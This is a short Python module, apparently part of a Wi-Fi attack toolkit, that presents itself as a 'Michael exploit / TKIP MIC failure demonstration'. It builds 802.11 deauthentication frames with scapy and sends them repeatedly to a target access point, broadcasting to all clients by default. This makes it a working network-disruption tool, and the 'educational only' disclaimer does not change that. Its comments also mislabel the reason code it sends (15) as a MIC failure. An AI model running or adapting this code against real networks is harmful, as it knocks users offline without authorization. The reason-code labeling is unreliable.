"""
Michael Exploit / TKIP MIC Failure demonstration.
Educational only — real-world exploitation is complex and rare.
"""
from scapy.all import sendp
from daemon.modules.utils.packet_crafter import PacketCrafter


class MichaelExploit:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger

    def run(self, args):
        bssid = args.bssid
        client = args.client or "ff:ff:ff:ff:ff:ff"
        iface = self.config.mon_iface
        count = args.count

        self.logger.warning("Michael exploit is for educational demonstration only.")
        self.logger.attack_log(f"Sending deauth with MIC failure reason -> {bssid}")
        pkts = PacketCrafter.deauth(bssid, client, reason=15)
        try:
            sendp(pkts, iface=iface, count=count, verbose=0)
            self.logger.success("Michael demonstration complete.")
            return True
        except Exception as e:
            self.logger.error(f"Michael exploit failed: {e}")
            return False
